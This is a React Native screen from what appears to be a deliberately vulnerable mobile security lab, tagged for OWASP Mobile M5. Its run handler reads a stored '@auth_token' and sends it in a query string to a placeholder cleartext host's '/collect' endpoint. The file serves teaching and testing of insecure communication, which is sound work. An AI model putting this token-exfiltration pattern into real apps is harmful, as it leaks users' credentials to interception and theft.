import React from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LabScreen } from '../../components/LabScreen';
import { CLEARTEXT_HOST } from '../../lib/placeholders';
// DIRNA-VULN:m5_secret_exfil — stored secret exfiltrated to a cleartext endpoint
export default function M5SecretExfil(){ return <LabScreen title="Secret exfil to cleartext" owasp={['M5']}
  run={async ()=>{ const token=await AsyncStorage.getItem('@auth_token'); await fetch(`${CLEARTEXT_HOST}/collect?t=`+token).catch(()=>{}); return 'sent token to '+CLEARTEXT_HOST; }} />; }
